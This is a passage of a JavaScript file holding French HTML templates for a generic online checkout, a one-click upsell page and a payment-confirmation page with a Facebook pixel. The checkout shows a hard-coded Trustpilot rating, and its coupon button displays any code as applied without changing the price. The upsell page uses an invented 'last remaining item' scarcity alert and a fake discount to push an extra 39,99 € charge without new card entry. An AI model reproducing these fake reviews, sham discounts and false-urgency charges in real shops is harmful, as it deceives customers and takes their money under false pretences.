        <div class="field-group field-row">
          <div class="field">
            <input type="text" id="first_name" placeholder=" " autocomplete="given-name"/>
            <label for="first_name">Prénom</label>
          </div>
          <div class="field">
            <input type="text" id="last_name" placeholder=" " autocomplete="family-name"/>
            <label for="last_name">Nom</label>
          </div>
        </div>

        <!-- Address with Nominatim autocomplete -->
        <div class="field-group autocomplete-wrap" id="addressWrap">
          <div class="field">
            <input type="text" id="address" placeholder=" " autocomplete="off"/>
            <label for="address">Adresse</label>
          </div>
          <div class="autocomplete-list" id="addressList" role="listbox"></div>
        </div>

        <div class="field-group">
          <div class="field">
            <input type="text" id="address2" placeholder=" " autocomplete="address-line2"/>
            <label for="address2">Appartement, suite… (facultatif)</label>
          </div>
        </div>

        <div class="field-group field-row">
          <div class="field">
            <input type="text" id="city" placeholder=" " autocomplete="address-level2"/>
            <label for="city">Ville</label>
          </div>
          <div class="field">
            <input type="text" id="zip" placeholder=" " autocomplete="postal-code"/>
            <label for="zip">Code postal</label>
          </div>
        </div>

        <div class="field-group">
          <div class="field">
            <input type="tel" id="phone" placeholder=" " autocomplete="tel"/>
            <label for="phone">Téléphone</label>
          </div>
        </div>
      </div>

      <hr class="section-divider"/>

      <!-- Shipping Method — single, texte dynamique via __SHIPPING__ -->
      <div style="margin-bottom:24px">
        <p class="section-heading">Mode de livraison</p>
        <div class="shipping-single">
          <div class="ship-dot"></div>
          <div class="ship-info">
            <div class="ship-name-display" id="ship-display">—</div>
            <div class="ship-delay">Livraison express · offerte</div>
          </div>
          <span class="ship-badge">Gratuit</span>
        </div>
      </div>

      <hr class="section-divider"/>

      <!-- Payment -->
      <div>
        <p class="section-heading">Paiement</p>
        <p style="font-size:12px;color:var(--g600);margin-bottom:14px;display:flex;align-items:center;gap:5px">
          <svg width="12" height="14" viewBox="0 0 12 14" fill="none">
            <path d="M6 1L1 3.5v3.8C1 10.1 3.2 12.8 6 13.5c2.8-.7 5-3.4 5-6.2V3.5L6 1z" stroke="#737373" stroke-width="1.1" fill="none"/>
            <path d="M4 7l1.4 1.5L8 5" stroke="#737373" stroke-width="1.1" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          Toutes les transactions sont chiffrées et sécurisées.
        </p>

        <div class="field-group">
          <span class="form-label">Titulaire de la carte</span>
          <input id="card_holder" type="text" class="form-control" placeholder="Jean Dupont" autocomplete="cc-name"/>
        </div>

        <div id="card-ph">Chargement du module de paiement sécurisé…</div>
        <div id="card-container"></div>
        <div id="error" class="error-msg"></div>

        <button id="pay-btn" class="pay-btn" disabled>
          <svg width="14" height="16" viewBox="0 0 14 16" fill="none">
            <path d="M7 1L2 3.5v4c0 3 2 5.7 5 6.5 3-.8 5-3.5 5-6.5v-4L7 1z" stroke="white" stroke-width="1.3" fill="none"/>
            <path d="M5 8l1.5 1.5L9 5.5" stroke="white" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          <span id="pay-btn-text">Payer maintenant</span>
        </button>

        <!-- Trustpilot badge -->
        <div class="trustpilot-box">
          <div class="tp-top">
            <span class="tp-label">Excellent</span>
            <div class="tp-stars">
              <div class="tp-star"><svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg></div>
              <div class="tp-star"><svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg></div>
              <div class="tp-star"><svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg></div>
              <div class="tp-star"><svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg></div>
              <div class="tp-star half"><svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg></div>
            </div>
          </div>
          <div class="tp-bottom">
            Not\u00e9 4.7/5 sur 3167 avis sur
            <div class="tp-logo">
              <div class="tp-logo-star"><svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg></div>
              Trustpilot
            </div>
          </div>
        </div>
        <p class="secure-bottom">🔒 Paiement chiffré 256-bit · Vos données sont protégées</p>
      </div>

      <nav class="form-footer">
        <a href="#">Remboursements</a>
        <a href="#">Confidentialité</a>
        <a href="#">Conditions d'utilisation</a>
      </nav>
    </div>
  </section>

  <!-- ══ SUMMARY SIDE ══ -->
  <aside class="summary-side">
    <div class="summary-inner">

      <div id="sum-items" class="order-items"></div>

      <div class="coupon-row">
        <input type="text" id="coupon" class="coupon-input" placeholder="Code de réduction"/>
        <button class="btn-apply" id="apply-btn">Appliquer</button>
      </div>

      <div class="promo-row" id="promoRow" style="display:none">
        <span class="promo-tag">
          🏷 <span id="promoCode"></span>
          <span class="remove" id="remove-promo">×</span>
        </span>
        <span style="font-size:12px;color:var(--g600)" id="promoDesc"></span>
      </div>

      <div class="totals">
        <div class="total-line"><span class="lbl">Sous-total</span><span class="val" id="sum-sub">—</span></div>
        <div class="total-line"><span class="lbl">Livraison</span><span class="val free">Gratuit</span></div>
        <div class="total-line grand">
          <span class="lbl">Total</span>
          <span class="val"><span class="cur-label" id="sum-cur">EUR</span><span id="sum-total">—</span></span>
        </div>
      </div>

    </div>
  </aside>

</div><!-- /checkout-layout -->

<script src="/config.js"></script>
<script>
(function(){
  var qs = new URLSearchParams(location.search);
  var order = {
    amount: qs.get('amount'),
    currency: qs.get('currency'),
    order_ref: qs.get('order_ref'),
    sig: qs.get('sig'),
    shop: qs.get('shop')
  };
  var DCUR = 'EUR';

  // ── Shipping display (server replaces __SHIPPING__ before sending) ──
  var SHIPPING_TEXT = '__SHIPPING__';
  document.getElementById('ship-display').textContent = SHIPPING_TEXT;

  // ── Price display ──
  var disp = order.amount ? (order.amount + ' ' + DCUR) : '—';
  document.getElementById('sum-sub').textContent = disp;
  document.getElementById('sum-cur').textContent = DCUR;
  document.getElementById('sum-total').textContent = order.amount || '—';
  document.getElementById('mobileTotal').textContent = order.amount ? (order.amount + ' EUR') : '—';
  document.getElementById('m-sub').textContent = disp;
  document.getElementById('m-total').textContent = order.amount || '—';

  // Update pay button with amount
  if (order.amount) {
    document.getElementById('pay-btn-text').textContent = 'Payer maintenant \u00b7 ' + order.amount + ' ' + DCUR;
  }

  // ── Helpers ──
  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"]/g, function(c) {
      return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];
    });
  }
  function v(id) {
    var el = document.getElementById(id);
    return el ? el.value.trim() : '';
  }
  function showError(m) { document.getElementById('error').textContent = m; }

  // ── Render items ──
  function buildItemsHtml() {
    var html = '';
    var raw = qs.get('items');
    if (raw) {
      try {
        var arr = JSON.parse(decodeURIComponent(escape(atob(raw))));
        arr.forEach(function(it) {
          var imgInner = it.img
            ? '<img src="' + esc(it.img) + '" alt="" style="width:100%;height:100%;object-fit:cover;border-radius:8px"/>'
            : '\uD83D\uDECD\uFE0F';
          html += '<div class="order-item">'
            + '<div class="item-img-wrap">'
              + '<div class="item-img">' + imgInner + '</div>'
              + '<div class="item-qty">' + (it.qty || 1) + '</div>'
            + '</div>'
            + '<div class="item-meta">'
              + '<div class="item-name">' + esc(it.title) + '</div>'
              + (it.variant ? '<div class="item-variant">' + esc(it.variant) + '</div>' : '')
            + '</div>'
            + '<div class="item-price">' + esc(it.price) + ' ' + DCUR + '</div>'
          + '</div>';
        });
      } catch(e) {}
    }
    if (!html) {
      var titleFallback = qs.get('title') || 'Commande __SHOP_NAME__';
      html = '<div class="order-item">'
        + '<div class="item-img-wrap"><div class="item-img">\uD83D\uDED2</div><div class="item-qty">1</div></div>'
        + '<div class="item-meta"><div class="item-name">' + esc(titleFallback) + '</div><div class="item-variant">Paiement s\u00e9curis\u00e9</div></div>'
        + '<div class="item-price">' + disp + '</div>'
      + '</div>';
    }
    return html;
  }
  var itemsHtml = buildItemsHtml();
  document.getElementById('sum-items').innerHTML = itemsHtml;
  document.getElementById('mobile-items').innerHTML = itemsHtml;

  // ── Mobile accordion ──
  var summaryOpen = false;
  document.getElementById('mobileToggle').addEventListener('click', function() {
    summaryOpen = !summaryOpen;
    document.getElementById('mobileBody').classList.toggle('open', summaryOpen);
    document.getElementById('toggleArrow').classList.toggle('open', summaryOpen);
    document.getElementById('toggleLabel').textContent = summaryOpen ? 'Masquer le r\u00e9capitulatif' : 'Afficher le r\u00e9capitulatif';
  });

  // ── Coupon ──
  document.getElementById('apply-btn').addEventListener('click', function() {
    var code = document.getElementById('coupon').value.trim().toUpperCase();
    if (code) {
      this.textContent = '\u2713 Appliqu\u00e9';
      this.classList.add('applied');
      document.getElementById('promoCode').textContent = code;
      document.getElementById('promoDesc').textContent = 'Code appliqu\u00e9';
      document.getElementById('promoRow').style.display = 'flex';
    }
  });
  document.getElementById('remove-promo').addEventListener('click', function() {
    document.getElementById('promoRow').style.display = 'none';
  });

  // ── SDK Payment ──
  var sess = null, cardReady = false;

  function setPay(loading) {
    var b = document.getElementById('pay-btn');
    b.disabled = loading;
    if (loading) {
      b.innerHTML = '<svg width="18" height="18" viewBox="0 0 38 38" stroke="#fff"><g fill="none"><g transform="translate(1 1)" stroke-width="2"><circle stroke-opacity=".4" cx="18" cy="18" r="18"/><path d="M36 18c0-9.9-8.1-18-18-18"><animateTransform attributeName="transform" type="rotate" from="0 18 18" to="360 18 18" dur="0.8s" repeatCount="indefinite"/></path></g></g></svg> Traitement\u2026';
    } else {
      var label = 'Payer maintenant' + (order.amount ? (' \u00b7 ' + order.amount + ' ' + DCUR) : '');
      b.innerHTML = '<svg width="14" height="16" viewBox="0 0 14 16" fill="none"><path d="M7 1L2 3.5v4c0 3 2 5.7 5 6.5 3-.8 5-3.5 5-6.5v-4L7 1z" stroke="white" stroke-width="1.3" fill="none"/><path d="M5 8l1.5 1.5L9 5.5" stroke="white" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/></svg><span>' + label + '</span>';
    }
  }

  function loadSdk() {
    return new Promise(function(res, rej) {
      if (window.Checkout) return res();
      var s = document.createElement('script');
      s.src = window.CHECKOUT_CONFIG.sdkUrl;
      s.onload = res;
      s.onerror = function() { rej(new Error('SDK non charg\u00e9')); };
      document.head.appendChild(s);
    });
  }

  fetch('/api/sdk').then(function(r) { return r.json(); }).then(function(data) {
    if (data.status !== 'success') throw new Error(data.message);
    return loadSdk().then(function() {
      Checkout.init({
        containerId: 'card-container',
        team_id: data.team_id,
        app_id: data.app_id,
        language: 'fr',
        onReady: function() {
          cardReady = true;
          document.getElementById('pay-btn').disabled = false;
          document.getElementById('card-ph').style.display = 'none';
        },
        onCard: onCard,
        onError: function(e) { setPay(false); showError(e.message || 'Erreur de paiement'); }
      });
    });
  }).catch(function() {
    document.getElementById('card-ph').textContent = 'Erreur de chargement du module de paiement.';
  });

  function onCard(cd) {
    var shopParam = order.shop ? ('&shop=' + encodeURIComponent(order.shop)) : '';
    fetch('/api/complete', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        transaction_unique_id: sess.transaction_unique_id,
        session_token: sess.session_token,
        card_token: cd.cardToken,
        encrypted_cvv: cd.encryptedCvv,
        bin: cd.bin, last4: cd.last4,
        card_holder: v('card_holder'),
        card_exp_month: cd.expMonth,
        card_exp_year: cd.expYear
      })
    }).then(function(r) { return r.json(); }).then(function(d) {
      if (d.acs_url) { window.location.href = d.acs_url; return; }
      window.location.href = '/api/bridge?txn=' + encodeURIComponent(sess.transaction_unique_id) + shopParam;
    }).catch(function(e) { setPay(false); showError(e.message); });
  }

  document.getElementById('pay-btn').addEventListener('click', function() {
    var em = v('email'), fn = v('first_name'), ln = v('last_name'), co = v('country');
    if (!em || em.indexOf('@') < 1) { showError('Adresse e-mail invalide.'); return; }
    if (!fn || !ln) { showError('Pr\u00e9nom et nom requis.'); return; }
    if (!co) { showError('Pays requis.'); return; }
    if (!cardReady) { showError('Module de paiement en cours de chargement\u2026'); return; }
    if (!v('card_holder')) { showError('Nom sur la carte requis.'); return; }
    showError(''); setPay(true);
    fetch('/api/init', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        amount: order.amount, currency: order.currency,
        order_ref: order.order_ref, sig: order.sig, shop: order.shop,
        items: qs.get('items'), title: qs.get('title'),
        customer: {
          first_name: fn, last_name: ln, email: em, country: co,
          address: v('address'), city: v('city'), state: '', zip: v('zip'), phone: v('phone')
        }
      })
    }).then(function(r) { return r.json(); }).then(function(d) {
      if (d.status !== 'success') throw new Error(d.message);
      sess = d;
      Checkout.submit('card-container');
    }).catch(function(e) { setPay(false); showError(e.message); });
  });

  if (!order.amount || !order.sig) {
    showError('Lien de paiement invalide ou expir\u00e9.');
    document.getElementById('pay-btn').disabled = true;
  }

  // ── Nominatim Address Autocomplete ──
  // Mapping ISO 3166-1 alpha-3 → alpha-2 pour l'API Nominatim
  var CC3TO2 = {
    'FRA':'fr','BEL':'be','CHE':'ch','LUX':'lu','MCO':'mc','CAN':'ca',
    'DEU':'de','ESP':'es','ITA':'it','PRT':'pt','NLD':'nl','GBR':'gb',
    'IRL':'ie','USA':'us','AUT':'at','POL':'pl','SWE':'se','DNK':'dk',
    'NOR':'no','FIN':'fi','GRC':'gr','MAR':'ma','DZA':'dz','TUN':'tn',
    'SEN':'sn','CIV':'ci','AUS':'au','JPN':'jp'
  };

  var addressInput = document.getElementById('address');
  var addressList = document.getElementById('addressList');
  var cityInput = document.getElementById('city');
  var zipInput = document.getElementById('zip');
  var debounceTimer = null;
  var acFocus = -1;

  function renderSuggestions(results) {
    addressList.innerHTML = '';
    acFocus = -1;
    if (!results.length) { addressList.classList.remove('open'); return; }
    results.forEach(function(item) {
      var addr = item.address || {};
      var road = addr.road || addr.pedestrian || addr.footway || addr.path || '';
      var num = addr.house_number || '';
      var mainLine = [num, road].filter(Boolean).join(' ') || item.display_name.split(',')[0];
      var city = addr.city || addr.town || addr.village || addr.municipality || '';
      var postcode = addr.postcode || '';
      var country = addr.country || '';
      var subLine = [postcode, city, country].filter(Boolean).join(', ');
      var el = document.createElement('div');
      el.className = 'autocomplete-item';
      el.setAttribute('role', 'option');
      el.innerHTML = '<div class="ac-icon"><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/></svg></div>'
        + '<div><div class="ac-main">' + esc(mainLine) + '</div>'
        + (subLine ? '<div class="ac-sub">' + esc(subLine) + '</div>' : '') + '</div>';
      el.addEventListener('mousedown', function(e) {
        e.preventDefault();
        addressInput.value = mainLine;
        if (postcode) zipInput.value = postcode;
        if (city) cityInput.value = city;
        addressList.classList.remove('open');
      });
      addressList.appendChild(el);
    });
    addressList.classList.add('open');
  }

  addressInput.addEventListener('input', function() {
    var q = addressInput.value.trim();
    clearTimeout(debounceTimer);
    if (q.length < 3) { addressList.classList.remove('open'); return; }
    addressList.innerHTML = '<div class="ac-spinner">Recherche d\\'adresses\u2026</div>';
    addressList.classList.add('open');
    debounceTimer = setTimeout(function() {
      var alpha3 = document.getElementById('country').value || 'FRA';
      var cc = CC3TO2[alpha3] || 'fr';
      var url = 'https://nominatim.openstreetmap.org/search?format=json&q='
        + encodeURIComponent(q)
        + '&countrycodes=' + cc
        + '&addressdetails=1&limit=6&accept-language=fr';
      fetch(url, {headers:{'Accept-Language':'fr'}})
        .then(function(r) { return r.json(); })
        .then(function(data) { renderSuggestions(data); })
        .catch(function() { addressList.classList.remove('open'); });
    }, 350);
  });

  addressInput.addEventListener('keydown', function(e) {
    var items = addressList.querySelectorAll('.autocomplete-item');
    if (!items.length) return;
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      acFocus = Math.min(acFocus + 1, items.length - 1);
      items.forEach(function(it, i) { it.classList.toggle('focused', i === acFocus); });
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      acFocus = Math.max(acFocus - 1, 0);
      items.forEach(function(it, i) { it.classList.toggle('focused', i === acFocus); });
    } else if (e.key === 'Enter' && acFocus >= 0) {
      e.preventDefault();
      items[acFocus].dispatchEvent(new MouseEvent('mousedown'));
    } else if (e.key === 'Escape') {
      addressList.classList.remove('open');
    }
  });

  document.addEventListener('click', function(e) {
    if (!document.getElementById('addressWrap').contains(e.target)) {
      addressList.classList.remove('open');
    }
  });

})();
</script>
</body>
</html>`;

const UPSELL_HTML = `<!DOCTYPE html>
<html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Offre Spéciale - __SHOP_NAME__</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',sans-serif;background:#f7fafc;color:#2d3748;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#fff;border:1px solid #e2e8f0;border-radius:16px;max-width:500px;width:100%;padding:32px;box-shadow:0 10px 25px -5px rgba(0,0,0,0.05);text-align:center}
.top-lock{font-size:13px;color:#a0aec0;margin-bottom:20px;display:flex;align-items:center;justify-content:center;gap:6px}
.alert-banner{background:#fff5f5;border:1px solid #feb2b2;color:#c53030;padding:12px;border-radius:8px;font-size:13px;font-weight:700;margin-bottom:24px;text-transform:uppercase;letter-spacing:0.5px}
.title{font-size:20px;font-weight:700;color:#1a202c;margin-bottom:12px;line-height:1.3}
.desc{font-size:14px;color:#4a5568;line-height:1.6;margin-bottom:24px}
.product-card{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:16px;display:flex;align-items:center;gap:16px;text-align:left;margin-bottom:24px}
.prod-img{width:64px;height:64px;background:#edf2f7;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:28px}
.prod-details{flex:1}
.prod-title{font-size:14px;font-weight:700;color:#2d3748}
.prod-sub{font-size:12px;color:#718096;margin-top:2px}
.price-row{margin-top:6px;display:flex;align-items:center;gap:8px}
.old-price{font-size:13px;color:#a0aec0;text-decoration:line-through}
.new-price{font-size:16px;font-weight:700;color:#3182ce}
.info-box{font-size:12px;color:#718096;background:#ebf8ff;border:1px solid #bee3f8;padding:12px;border-radius:8px;margin-bottom:24px;line-height:1.5}
.btn-claim{width:100%;height:50px;background:#3182ce;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;box-shadow:0 4px 6px rgba(49,130,206,0.2);transition:all 0.15s;display:flex;align-items:center;justify-content:center}
.btn-claim:hover{background:#2b6cb0}
.btn-claim:disabled{background:#a0aec0;cursor:not-allowed;box-shadow:none}
.btn-skip{display:inline-block;margin-top:16px;font-size:13px;color:#a0aec0;text-decoration:none;transition:color 0.15s}
.btn-skip:hover{color:#718096}
</style></head><body>
<div class="box">
  <div class="top-lock">🔒 __SHOP_NAME__ · Système de Réservation</div>
  <div class="alert-banner">⚠️ ALERTE STOCK : 1 DERNIER ARTICLE DISPONIBLE !</div>
  <h1 class="title">Une pièce non attribuée détectée</h1>
  <p class="desc">Le système a détecté qu'il reste exactement <b>UN dernier article invendu</b> pour le quota "<b>__PRODUCT_NAME__</b>". Pour éviter qu'il ne reste vacant, l'organisateur vous le propose de manière exclusive.</p>
  <div class="product-card">
    <div class="prod-img">🎁</div>
    <div class="prod-details">
      <div class="prod-title">__PRODUCT_NAME__</div>
      <div class="prod-sub">Dernier article disponible immédiat</div>
      <div class="price-row">
        <span class="old-price">59,99 EUR</span>
        <span class="new-price">39,99 EUR</span>
      </div>
    </div>
  </div>
  <div class="info-box">⏱️ <b>Attention :</b> Cette offre est unique. Aucune saisie de carte bancaire n'est requise, votre commande initiale sera simplement mise à jour en 1 clic. Dès que vous quitterez cette page, cet article sera définitivement réattribué.</div>
  <button class="btn-claim" id="claim-btn">AJOUTER CET ARTICLE (39,99€ en 1 clic)</button>
  <a href="#" class="btn-skip" id="skip-btn">Non merci, je laisse cet article au client suivant</a>
</div>
<script>
var txn = "__TXN_ID__";
var shop = new URLSearchParams(window.location.search).get('shop') || '';
var shopParam = shop ? ('&shop=' + encodeURIComponent(shop)) : '';
document.getElementById('claim-btn').addEventListener('click', function() {
  var btn = this;
  btn.disabled = true;
  btn.textContent = 'Mise à jour de votre commande…';
  fetch('/api/upsell/submit', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({transaction_unique_id: txn})
  }).then(function() {
    window.location.href = '/return?txn=' + encodeURIComponent(txn) + shopParam;
  }).catch(function() {
    window.location.href = '/return?txn=' + encodeURIComponent(txn) + shopParam;
  });
});
document.getElementById('skip-btn').addEventListener('click', function(e) {
  e.preventDefault();
  window.location.href = '/return?txn=' + encodeURIComponent(txn) + shopParam;
});
</script>
</body></html>`;

const RETURN_HTML = `<!DOCTYPE html>
<html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Confirmation - __SHOP_NAME__</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init','1405300981421901');
fbq('track','PageView');
</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1405300981421901&ev=PageView&noscript=1"/></noscript>
<style>
body{font-family:'Inter',system-ui,sans-serif;background:#f7fafc;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#1a202c;margin:0;padding:20px}
.card{background:#fff;border:1px solid #e2e8f0;border-radius:16px;padding:40px;max-width:480px;width:100%;text-align:center;box-shadow:0 4px 6px -1px rgba(0,0,0,0.05)}
h1{font-size:22px;font-weight:700;margin:0 0 12px}
p{color:#4a5568;font-size:15px;margin:8px 0;line-height:1.6}
.ok{color:#10b981}.ko{color:#ef4444}.pending{color:#3b82f6}
.spinner{width:36px;height:36px;border:3px solid #e2e8f0;border-top-color:#3b82f6;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
.success-icon{font-size:48px;margin-bottom:16px;display:none}
</style></head><body>
<div class="card">
  <div class="spinner" id="spinner"></div>
  <div class="success-icon" id="success-icon">✅</div>
  <h1 id="title">Vérification de votre commande…</h1>
  <p id="msg">Merci de patienter pendant la validation du paiement.</p>
  <div id="fb-fallback"></div>
</div>
<script>
(function(){
var txn=new URLSearchParams(location.search).get('txn');
var title=document.getElementById('title'),msg=document.getElementById('msg'),spinner=document.getElementById('spinner'),icon=document.getElementById('success-icon'),tries=0;
function done(t,m,cls,showCheck){
  spinner.style.display='none';
  if(showCheck) icon.style.display='block';
  title.textContent=t;title.className=cls;msg.innerHTML=m;
}
function poll(){if(!txn){return done('Référence manquante','Impossible de valider la transaction. Merci de contacter le support.','ko',false);}
fetch('/api/status?txn='+encodeURIComponent(txn)).then(function(r){return r.json();}).then(function(d){
var s=(d.status||'').toLowerCase();
var ts=(d.transactionStatus||'').toLowerCase();
var code=parseInt(d.code, 10);
if(['success','approved','completed','paid'].includes(s)||ts==='success'||ts==='approved'||code===0){
  try{if(window.fbq)fbq('track','Purchase',{value:Number(d.amount)||0,currency:d.currency||'EUR'});}catch(e){}
  try{
    var fallbackImg=document.createElement('img');
    fallbackImg.height=1;fallbackImg.width=1;fallbackImg.style.display='none';
    fallbackImg.src='https://www.facebook.com/tr?id=1405300981421901&ev=Purchase&cd[value]='+(d.amount||0)+'&cd[currency]=EUR&noscript=1';
    document.getElementById('fb-fallback').appendChild(fallbackImg);
  }catch(e){}
  return done('Commande confirmée ! 🎉','Votre paiement a été validé avec succès.<br><br><b>✅ Votre commande sera expédiée sous peu.</b>','ok',true);
}
if(['declined','failed','error','rejected'].includes(s)||ts==='declined'||ts==='failed')return done('Paiement refusé ❌','La transaction n\'a pas abouti. Veuillez réessayer avec un autre moyen de paiement.','ko',false);
tries++;if(tries>25)return done('Traitement en cours…','Votre paiement prend un peu de temps à être validé. Vous recevrez une confirmation par e-mail dès validation.','pending',false);
setTimeout(poll,2000);}).catch(function(){setTimeout(poll,2000);});}
poll();
})();
</script></body></html>`;
